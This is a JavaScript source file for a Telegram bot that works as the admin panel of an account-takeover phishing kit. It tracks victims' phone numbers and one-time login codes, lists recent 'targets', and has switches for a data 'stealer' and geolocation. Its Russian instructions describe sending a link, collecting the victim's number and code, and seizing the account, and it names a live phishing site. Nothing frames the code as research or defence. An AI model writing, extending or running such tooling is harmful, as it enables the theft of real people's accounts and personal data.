// ==== file: bot.js ====
import TelegramBot from 'node-telegram-bot-api';
import { Utils } from './utils.js';

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_ID) process.exit(1);

export const bot = new TelegramBot(BOT_TOKEN, { polling: true });

export const State = {
    history: [],
    stats: { visits: 0, clicks: 0, phones: 0, codes: 0, osCount: {} },
    settings: { notifyEnabled: true, doubleCode: true, stealData: true, geoEnabled: true },
    startTime: Date.now(),
    rateLimit: new Map()
};

export const sendAdmin = async (text) => {
    if (!State.settings.notifyEnabled) return;
    try { await bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' }); } catch (e) {}
};

const bottomKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📊 Статистика' }, { text: '📜 История' }],
            [{ text: '⚙️ Настройки' }, { text: '📖 Инструкция' }],
            [{ text: '🌐 Открыть Сайт' }]
        ], resize_keyboard: true, is_persistent: true
    }
};

bot.onText(/^\/start$/, (msg) => {
    bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML', ...bottomKeyboard });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (text === '📊 Статистика') {
        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
        const sys = Utils.getSystemStats();
        bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\n⏱ Аптайм: ${sys.uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
    }
    if (text === '📜 История') {
        if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
        const hist = State.history.slice(0, 15).map((h, i) => `<b>${i + 1}.</b> <code>${h.phone}</code> | <code>${h.code}</code>`).join('\n');
        bot.sendMessage(chatId, `📜 <b>Последние 15 целей:</b>\n\n${hist}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🗑 Очистить', callback_data: 'clear' }]] } });
    }
    if (text === '⚙️ Настройки') {
        const s = State.settings;
        bot.sendMessage(chatId, `⚙️ <b>Настройки</b>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
            [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
            [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
            [{ text: `Гео: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
        ] } });
    }
    if (text === '📖 Инструкция') {
        bot.sendMessage(chatId, `📖 <b>Инструкция</b>\n\n1. Скинь ссылку.\n2. Жертва вводит номер.\n3. Вводишь номер в Telegram.\n4. Жертва вводит код.\n5. Забираешь аккаунт.`, { parse_mode: 'HTML' });
    }
    if (text === '🌐 Открыть Сайт') {
        bot.sendMessage(chatId, `🌐 https://tg-sms-2.onrender.com`);
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id, data = query.data;
    bot.answerCallbackQuery(query.id);
    if (data === 'stats') {
        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
        bot.editMessageText(`📊 <b>Статистика</b>\n\n⏱ Аптайм: ${Utils.getSystemStats().uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
    }
    if (data === 'clear') {
        State.history = []; State.stats.phones = 0; State.stats.codes = 0;
        bot.editMessageText('🗑 Очищено.', { chat_id: chatId, message_id: query.message.message_id });
    }
    if (data === 't_notify') State.settings.notifyEnabled = !State.settings.notifyEnabled;
    if (data === 't_double') State.settings.doubleCode = !State.settings.doubleCode;
    if (data === 't_steal') State.settings.stealData = !State.settings.stealData;
    if (data === 't_geo') State.settings.geoEnabled = !State.settings.geoEnabled;
    if (data.startsWith('t_')) {
        const s = State.settings;
        bot.editMessageText(`⚙️ <b>Настройки</b>`, { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
            [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
            [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
            [{ text: `Гео: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
        ] } });
    }
});
